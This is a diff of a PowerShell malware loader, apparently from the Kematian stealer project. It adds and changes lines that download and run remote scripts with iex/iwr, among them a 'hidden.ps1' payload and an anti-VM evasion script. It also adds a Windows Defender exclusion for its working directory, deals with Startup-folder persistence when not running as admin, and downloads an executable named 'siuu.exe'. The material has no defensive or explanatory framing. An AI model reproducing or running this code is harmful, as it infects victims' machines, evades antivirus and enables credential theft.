@@ -1,6 +1,5 @@
 $skid = "skid"
-iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/something.ps1" -useb)
-
+iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/hidden.ps1" -useb)
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     $startup = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')
 
@@ -33,6 +32,7 @@ New-Item -ItemType Directory -Path $temp
 Add-MpPreference -ExclusionPath $dir
 
 
+iex (iwr -uri "https://raw.githubusercontent.com/adasdasdsaf/Kematian-Stealer/main/frontend-src/antivm.ps1" -useb)
 
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/siuu.exe" -OutFile "$dir\remote.exe"
 
